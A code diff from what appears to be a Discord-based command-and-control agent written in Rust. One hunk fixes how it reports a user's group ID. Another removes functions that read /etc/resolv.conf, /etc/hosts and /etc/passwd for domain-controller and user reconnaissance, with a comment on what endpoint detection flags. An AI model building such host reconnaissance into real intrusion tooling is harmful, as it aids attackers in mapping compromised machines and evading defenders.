@@ -70,8 +70,9 @@ pub fn run_recon(command: &str, recon_type: ReconType) -> String {
 					// On Windows, this value defaults to 0, and as such there is no need to display this in the output.
 					#[cfg(target_os = "linux")]
 					output.push_str(format!(
-						"\x1b[1;32m User's Group ID: {}\x1b[0m",
-					));
+						"\x1b[1;32m User's Group ID: {:?}\x1b[0m",
+						user.group_id()
+					).as_str());
 
 					output.push('\n');
 
@@ -124,38 +125,4 @@ pub fn user() -> String {
 pub async fn ip() -> Result<String, DiscordC2Error> {
     let ip = get_public_ip().await.map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
     Ok(ip)
-}
-
-/// even though the concept of AD doesn't fully exist on linux, you can still kinda domain-join a linux machine to an
-/// AD domain using 3rd-party tools. one of those steps involve using your domain controller's DNS server. we want to
-/// get the contents of the glibc DNS resolver file /etc/resolv.conf for a potential Windows domain controller DNS server.
-/// userspace software MUST be able to read /etc/resolv.conf, otherwise DNS resolution would be broken. this is always
-/// available.
-#[cfg(target_os = "linux")]
-pub async fn get_resolv_conf() -> String {
-    let resolv_conf = Path::new("/etc/resolv.conf");
-    let file = fs::read_to_string(resolv_conf).unwrap_or("Unknown".to_string());
-
-    file
-}
-
-/// /etc/hosts contains mappings of IP addresses to FQDNs. if the linux machine is domain joined, this will usually be
-/// populated with things like a DC hostname
-#[cfg(target_os = "linux")]
-pub async fn get_etc_hosts() -> String {
-    let hosts = Path::new("/etc/hosts");
-    let file = fs::read_to_string(hosts).unwrap_or("Unknown".to_string());
-
-    file
-}
-
-/// /etc/passwd contains valuable information about the users on the machine such as the default shells, if accounts are
-/// locked, the default HOME directories per account, the description of the accounts, their user ID, and group ID.
-/// warning: EDRs WILL detect any attempts at reading /etc/passwd for recon, just like /etc/shadow for cred harvesting
-#[cfg(target_os = "linux")]
-pub async fn get_etc_passwd() -> String {
-    let etc_passwd = Path::new("/etc/passwd");
-    let file = fs::read_to_string(etc_passwd).unwrap_or("Unknown".to_string());
-
-    file
 }
